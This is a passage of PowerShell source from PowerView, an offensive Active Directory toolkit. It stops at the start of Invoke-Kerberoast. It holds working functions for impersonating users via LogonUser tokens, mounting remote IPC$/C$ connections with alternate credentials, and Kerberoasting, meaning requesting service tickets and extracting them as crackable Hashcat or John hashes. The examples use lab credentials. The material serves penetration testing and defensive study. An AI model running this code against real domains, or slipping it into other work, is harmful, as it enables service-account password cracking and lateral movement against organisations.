'InitEx' (\n                        $ADSInitType,\n                        $InitName,\n                        $Cred.UserName,\n                        $Cred.Domain,\n                        $Cred.Password\n                    )\n                }\n                catch {\n                    Write-Verbose \"[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_\"\n                }\n            }\n            else {\n                try {\n                    $Null = Invoke-Method $Translate 'Init' (\n                        $ADSInitType,\n                        $InitName\n                    )\n                }\n                catch {\n                    Write-Verbose \"[Convert-ADName] Error initializing translation for '$Identity' : $_\"\n                }\n            }\n\n            # always chase all referrals\n            Set-Property $Translate 'ChaseReferral' (0x60)\n\n            try {\n                # 8 = Unknown name type -> let the server do the work for us\n                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)\n                Invoke-Method $Translate 'Get' ($ADSOutputType)\n            }\n            catch [System.Management.Automation.MethodInvocationException] {\n                Write-Verbose \"[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)\"\n            }\n        }\n    }\n}\n\n\nfunction ConvertFrom-UACValue {\n<#\n.SYNOPSIS\n\nConverts a UAC int value to human readable form.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nThis function will take an integer that represents a User Account\nControl (UAC) binary blob and will covert it to an ordered\ndictionary with each bitwise value broken out. By default only values\nset are displayed- the -ShowAll switch will display all values with\na + next to the ones set.\n\n.PARAMETER Value\n\nSpecifies the integer UAC value to convert.\n\n.PARAMETER ShowAll\n\nSwitch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.\n\n.EXAMPLE\n\nConvertFrom-UACValue -Value 66176\n\nName                           Value\n----                           -----\nENCRYPTED_TEXT_PWD_ALLOWED     128\nNORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n\n.EXAMPLE\n\nGet-DomainUser harmj0y | ConvertFrom-UACValue\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n\n.EXAMPLE\n\nGet-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll\n\nName                           Value\n----                           -----\nSCRIPT                         1\nACCOUNTDISABLE                 2\nHOMEDIR_REQUIRED               8\nLOCKOUT                        16\nPASSWD_NOTREQD                 32\nPASSWD_CANT_CHANGE             64\nENCRYPTED_TEXT_PWD_ALLOWED     128\nTEMP_DUPLICATE_ACCOUNT         256\nNORMAL_ACCOUNT                 512+\nINTERDOMAIN_TRUST_ACCOUNT      2048\nWORKSTATION_TRUST_ACCOUNT      4096\nSERVER_TRUST_ACCOUNT           8192\nDONT_EXPIRE_PASSWORD           65536+\nMNS_LOGON_ACCOUNT              131072\nSMARTCARD_REQUIRED             262144\nTRUSTED_FOR_DELEGATION         524288\nNOT_DELEGATED                  1048576\nUSE_DES_KEY_ONLY               2097152\nDONT_REQ_PREAUTH               4194304\nPASSWORD_EXPIRED               8388608\nTRUSTED_TO_AUTH_FOR_DELEGATION 16777216\nPARTIAL_SECRETS_ACCOUNT        67108864\n\n.INPUTS\n\nInt\n\nAccepts an integer representing a UAC binary blob.\n\n.OUTPUTS\n\nSystem.Collections.Specialized.OrderedDictionary\n\nAn ordered dictionary with the converted UAC fields.\n\n.LINK\n\nhttps://support.microsoft.com/en-us/kb/305144\n#>\n\n    [OutputType('System.Collections.Specialized.OrderedDictionary')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('UAC', 'useraccountcontrol')]\n        [Int]\n        $Value,\n\n        [Switch]\n        $ShowAll\n    )\n\n    BEGIN {\n        # values from https://support.microsoft.com/en-us/kb/305144\n        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary\n        $UACValues.Add(\"SCRIPT\", 1)\n        $UACValues.Add(\"ACCOUNTDISABLE\", 2)\n        $UACValues.Add(\"HOMEDIR_REQUIRED\", 8)\n        $UACValues.Add(\"LOCKOUT\", 16)\n        $UACValues.Add(\"PASSWD_NOTREQD\", 32)\n        $UACValues.Add(\"PASSWD_CANT_CHANGE\", 64)\n        $UACValues.Add(\"ENCRYPTED_TEXT_PWD_ALLOWED\", 128)\n        $UACValues.Add(\"TEMP_DUPLICATE_ACCOUNT\", 256)\n        $UACValues.Add(\"NORMAL_ACCOUNT\", 512)\n        $UACValues.Add(\"INTERDOMAIN_TRUST_ACCOUNT\", 2048)\n        $UACValues.Add(\"WORKSTATION_TRUST_ACCOUNT\", 4096)\n        $UACValues.Add(\"SERVER_TRUST_ACCOUNT\", 8192)\n        $UACValues.Add(\"DONT_EXPIRE_PASSWORD\", 65536)\n        $UACValues.Add(\"MNS_LOGON_ACCOUNT\", 131072)\n        $UACValues.Add(\"SMARTCARD_REQUIRED\", 262144)\n        $UACValues.Add(\"TRUSTED_FOR_DELEGATION\", 524288)\n        $UACValues.Add(\"NOT_DELEGATED\", 1048576)\n        $UACValues.Add(\"USE_DES_KEY_ONLY\", 2097152)\n        $UACValues.Add(\"DONT_REQ_PREAUTH\", 4194304)\n        $UACValues.Add(\"PASSWORD_EXPIRED\", 8388608)\n        $UACValues.Add(\"TRUSTED_TO_AUTH_FOR_DELEGATION\", 16777216)\n        $UACValues.Add(\"PARTIAL_SECRETS_ACCOUNT\", 67108864)\n    }\n\n    PROCESS {\n        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary\n\n        if ($ShowAll) {\n            ForEach ($UACValue in $UACValues.GetEnumerator()) {\n                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {\n                    $ResultUACValues.Add($UACValue.Name, \"$($UACValue.Value)+\")\n                }\n                else {\n                    $ResultUACValues.Add($UACValue.Name, \"$($UACValue.Value)\")\n                }\n            }\n        }\n        else {\n            ForEach ($UACValue in $UACValues.GetEnumerator()) {\n                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {\n                    $ResultUACValues.Add($UACValue.Name, \"$($UACValue.Value)\")\n                }\n            }\n        }\n        $ResultUACValues\n    }\n}\n\n\nfunction Get-PrincipalContext {\n<#\n.SYNOPSIS\n\nHelper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext\nand simplified identity.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.PARAMETER Identity\n\nA group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),\nor a DOMAIN\\username identity.\n\n.PARAMETER Domain\n\nSpecifies the domain to use to search for user/group principals, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True)]\n        [Alias('GroupName', 'GroupIdentity')]\n        [String]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    Add-Type -AssemblyName System.DirectoryServices.AccountManagement\n\n    try {\n        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\\\.+')) {\n            if ($Identity -match '.+\\\\.+') {\n                # DOMAIN\\groupname\n                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical\n                if ($ConvertedIdentity) {\n                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))\n                    $ObjectIdentity = $Identity.Split('\\')[1]\n                    Write-Verbose \"[Get-PrincipalContext] Binding to domain '$ConnectTarget'\"\n                }\n            }\n            else {\n                $ObjectIdentity = $Identity\n                Write-Verbose \"[Get-PrincipalContext] Binding to domain '$Domain'\"\n                $ConnectTarget = $Domain\n            }\n\n            if ($PSBoundParameters['Credential']) {\n                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'\n                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)\n            }\n            else {\n                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)\n            }\n        }\n        else {\n            if ($PSBoundParameters['Credential']) {\n                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'\n                $DomainName = Get-Domain | Select-Object -ExpandProperty Name\n                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)\n            }\n            else {\n                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n            }\n            $ObjectIdentity = $Identity\n        }\n\n        $Out = New-Object PSObject\n        $Out | Add-Member Noteproperty 'Context' $Context\n        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity\n        $Out\n    }\n    catch {\n        Write-Warning \"[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_\"\n    }\n}\n\n\nfunction Add-RemoteConnection {\n<#\n.SYNOPSIS\n\nPseudo \"mounts\" a connection to a remote path using the specified\ncredential object, allowing for access of remote resources. If a -Path isn't\nspecified, a -ComputerName is required to pseudo-mount IPC$.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect  \n\n.DESCRIPTION\n\nThis function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection\nto the specified remote -Path (\\\\UNC\\share) with the alternate credentials specified in the\n-Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.\n\nTo destroy the connection, use Remove-RemoteConnection with the same specified \\\\UNC\\share path\nor -ComputerName.\n\n.PARAMETER ComputerName\n\nSpecifies the system to add a \\\\ComputerName\\IPC$ connection for.\n\n.PARAMETER Path\n\nSpecifies the remote \\\\UNC\\path to add the connection for.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system.\n\n.EXAMPLE\n\n$Cred = Get-Credential\nAdd-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nAdd-RemoteConnection -Path '\\\\PRIMARY.testlab.local\\C$\\' -Credential $Cred\n\n.EXAMPLE\n\n$Cred = Get-Credential\n@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName,\n\n        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]\n        [ValidatePattern('\\\\\\\\.*\\\\.*')]\n        [String[]]\n        $Path,\n\n        [Parameter(Mandatory = $True)]\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential\n    )\n\n    BEGIN {\n        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)\n        $NetResourceInstance.dwType = 1\n    }\n\n    PROCESS {\n        $Paths = @()\n        if ($PSBoundParameters['ComputerName']) {\n            ForEach ($TargetComputerName in $ComputerName) {\n                $TargetComputerName = $TargetComputerName.Trim('\\')\n                $Paths += ,\"\\\\$TargetComputerName\\IPC$\"\n            }\n        }\n        else {\n            $Paths += ,$Path\n        }\n\n        ForEach ($TargetPath in $Paths) {\n            $NetResourceInstance.lpRemoteName = $TargetPath\n            Write-Verbose \"[Add-RemoteConnection] Attempting to mount: $TargetPath\"\n\n            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx\n            #   CONNECT_TEMPORARY = 4\n            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)\n\n            if ($Result -eq 0) {\n                Write-Verbose \"$TargetPath successfully mounted\"\n            }\n            else {\n                Throw \"[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)\"\n            }\n        }\n    }\n}\n\n\nfunction Remove-RemoteConnection {\n<#\n.SYNOPSIS\n\nDestroys a connection created by New-RemoteConnection.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect  \n\n.DESCRIPTION\n\nThis function uses WNetCancelConnection2 to destroy a connection created by\nNew-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to\n'unmount' \\\\$ComputerName\\IPC$.\n\n.PARAMETER ComputerName\n\nSpecifies the system to remove a \\\\ComputerName\\IPC$ connection for.\n\n.PARAMETER Path\n\nSpecifies the remote \\\\UNC\\path to remove the connection for.\n\n.EXAMPLE\n\nRemove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'\n\n.EXAMPLE\n\nRemove-RemoteConnection -Path '\\\\PRIMARY.testlab.local\\C$\\'\n\n.EXAMPLE\n\n@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName,\n\n        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]\n        [ValidatePattern('\\\\\\\\.*\\\\.*')]\n        [String[]]\n        $Path\n    )\n\n    PROCESS {\n        $Paths = @()\n        if ($PSBoundParameters['ComputerName']) {\n            ForEach ($TargetComputerName in $ComputerName) {\n                $TargetComputerName = $TargetComputerName.Trim('\\')\n                $Paths += ,\"\\\\$TargetComputerName\\IPC$\"\n            }\n        }\n        else {\n            $Paths += ,$Path\n        }\n\n        ForEach ($TargetPath in $Paths) {\n            Write-Verbose \"[Remove-RemoteConnection] Attempting to unmount: $TargetPath\"\n            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)\n\n            if ($Result -eq 0) {\n                Write-Verbose \"$TargetPath successfully ummounted\"\n            }\n            else {\n                Throw \"[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)\"\n            }\n        }\n    }\n}\n\n\nfunction Invoke-UserImpersonation {\n<#\n.SYNOPSIS\n\nCreates a new \"runas /netonly\" type logon and impersonates the token.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect  \n\n.DESCRIPTION\n\nThis function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType\nto simulate \"runas /netonly\". The resulting token is then impersonated with\nImpersonateLoggedOnUser() and the token handle is returned for later usage\nwith Invoke-RevertToSelf.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object with alternate credentials\nto impersonate in the current thread space.\n\n.PARAMETER TokenHandle\n\nAn IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.\nIf this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()\nis executed.\n\n.PARAMETER Quiet\n\nSuppress any warnings about STA vs MTA.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nInvoke-UserImpersonation -Credential $Cred\n\n.OUTPUTS\n\nIntPtr\n\nThe TokenHandle result from LogonUser.\n#>\n\n    [OutputType([IntPtr])]\n    [CmdletBinding(DefaultParameterSetName = 'Credential')]\n    Param(\n        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]\n        [ValidateNotNull()]\n        [IntPtr]\n        $TokenHandle,\n\n        [Switch]\n        $Quiet\n    )\n\n    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {\n        Write-Warning \"[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.\"\n    }\n\n    if ($PSBoundParameters['TokenHandle']) {\n        $LogonTokenHandle = $TokenHandle\n    }\n    else {\n        $LogonTokenHandle = [IntPtr]::Zero\n        $NetworkCredential = $Credential.GetNetworkCredential()\n        $UserDomain = $NetworkCredential.Domain\n        $UserName = $NetworkCredential.UserName\n        Write-Warning \"[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\\$($UserName)\"\n\n        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3\n        #   this is to simulate \"runas.exe /netonly\" functionality\n        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();\n\n        if (-not $Result) {\n            throw \"[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n        }\n    }\n\n    # actually impersonate the token from LogonUser()\n    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)\n\n    if (-not $Result) {\n        throw \"[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n    }\n\n    Write-Verbose \"[Invoke-UserImpersonation] Alternate credentials successfully impersonated\"\n    $LogonTokenHandle\n}\n\n\nfunction Invoke-RevertToSelf {\n<#\n.SYNOPSIS\n\nReverts any token impersonation.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect  \n\n.DESCRIPTION\n\nThis function uses RevertToSelf() to revert any impersonated tokens.\nIf -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),\nCloseHandle() is used to close the opened handle.\n\n.PARAMETER TokenHandle\n\nAn optional IntPtr TokenHandle returned by Invoke-UserImpersonation.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\n$Token = Invoke-UserImpersonation -Credential $Cred\nInvoke-RevertToSelf -TokenHandle $Token\n#>\n\n    [CmdletBinding()]\n    Param(\n        [ValidateNotNull()]\n        [IntPtr]\n        $TokenHandle\n    )\n\n    if ($PSBoundParameters['TokenHandle']) {\n        Write-Warning \"[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle\"\n        $Result = $Kernel32::CloseHandle($TokenHandle)\n    }\n\n    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();\n\n    if (-not $Result) {\n        throw \"[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n    }\n\n    Write-Verbose \"[Invoke-RevertToSelf] Token impersonation successfully reverted\"\n}\n\n\nfunction Get-DomainSPNTicket {\n<#\n.SYNOPSIS\n\nRequest the kerberos ticket for a specified service principal name (SPN).\n\nAuthor: machosec, Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will either take one/more SPN strings, or one/more PowerView.User objects\n(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN\nusing System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted\nportion of the ticket is then extracted and output in either crackable John or Hashcat\nformat (deafult of Hashcat).\n\n.PARAMETER SPN\n\nSpecifies the service principal name to request the ticket for.\n\n.PARAMETER User\n\nSpecifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.\n\n.PARAMETER OutputFormat\n\nEither 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.\nDefaults to 'John'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote domain using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-DomainSPNTicket -SPN \"HTTP/web.testlab.local\"\n\nRequest a kerberos service ticket for the specified SPN.\n\n.EXAMPLE\n\n\"HTTP/web1.testlab.local\",\"HTTP/web2.testlab.local\" | Get-DomainSPNTicket\n\nRequest kerberos service tickets for all SPNs passed on the pipeline.\n\n.EXAMPLE\n\nGet-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR\n\nRequest kerberos service tickets for all users with non-null SPNs and output in JTR format.\n\n.INPUTS\n\nString\n\nAccepts one or more SPN strings on the pipeline with the RawSPN parameter set.\n\n.INPUTS\n\nPowerView.User\n\nAccepts one or more PowerView.User objects on the pipeline with the User parameter set.\n\n.OUTPUTS\n\nPowerView.SPNTicket\n\nOutputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.\n#>\n\n    [OutputType('PowerView.SPNTicket')]\n    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]\n    Param (\n        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]\n        [ValidatePattern('.*/.*')]\n        [Alias('ServicePrincipalName')]\n        [String[]]\n        $SPN,\n\n        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]\n        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]\n        [Object[]]\n        $User,\n\n        [ValidateSet('John', 'Hashcat')]\n        [Alias('Format')]\n        [String]\n        $OutputFormat = 'Hashcat',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')\n\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['User']) {\n            $TargetObject = $User\n        }\n        else {\n            $TargetObject = $SPN\n        }\n\n        ForEach ($Object in $TargetObject) {\n            if ($PSBoundParameters['User']) {\n                $UserSPN = $Object.ServicePrincipalName\n                $SamAccountName = $Object.SamAccountName\n                $DistinguishedName = $Object.DistinguishedName\n            }\n            else {\n                $UserSPN = $Object\n                $SamAccountName = 'UNKNOWN'\n                $DistinguishedName = 'UNKNOWN'\n            }\n\n            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3\n            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {\n                $UserSPN = $UserSPN[0]\n            }\n\n            try {\n                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN\n            }\n            catch {\n                Write-Warning \"[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_\"\n            }\n            if ($Ticket) {\n                $TicketByteStream = $Ticket.GetRequest()\n            }\n            if ($TicketByteStream) {\n                $Out = New-Object PSObject\n\n                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'\n\n                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName\n                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName\n                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName\n\n                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)\n                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object\n                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {\n                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )\n                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4\n                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)\n\n                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object\n                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {\n                        Write-Warning \"Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq\"\n                        $Hash = $null\n                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))\n                    } else {\n                        $Hash = \"$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))\"\n                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null\n                    }\n                } else {\n                    Write-Warning \"Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq\"\n                    $Hash = $null\n                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))\n                }\n\n                if($Hash) {\n                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...\n                    if ($OutputFormat -match 'John') {\n                        $HashFormat = \"`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash\"\n                    }\n                    else {\n                        if ($DistinguishedName -ne 'UNKNOWN') {\n                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        }\n                        else {\n                            $UserDomain = 'UNKNOWN'\n                        }\n\n                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...\n                        $HashFormat = \"`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash\"\n                    }\n                    $Out | Add-Member Noteproperty 'Hash' $HashFormat\n                }\n\n                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')\n                $Out\n            }\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Invoke-Kerberoast {\n<#\n.SYNOPSIS\n\nRequests service tickets for kerberoast-able accounts and returns extracted ticket hashes.\n\nAuthor: Will Schroeder (@harmj0y), @machosec  \nLicense: BSD 3-Clause  \nRequired Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  \n\n.DESCRIPTION\n\nUses Get-DomainUser to query for user accounts with non-null service principle\nnames (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.\nThe ticket format can be specified with -OutputFormat <John/Hashcat>.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER OutputFormat\n\nEither 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.\nDefaults to 'Hashcat'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nInvoke-Kerberoast | fl\n\nKerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).\n\n.EXAMPLE\n\nInvoke-Kerberoast -Domain dev.testlab.local | fl\n\nKerberoasts all found SPNs for the testlab.local domain, outputting to JTR\nformat instead of Hashcat.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\\dfm.a', $SecPassword)\nInvoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl\n\nKerberoasts all found SPNs for the testlab.local domain using alternate credentials.\n\n.OUTPUTS\n\nPowerView.SPNTicket\n\nOutputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.SPNTicket')]\n    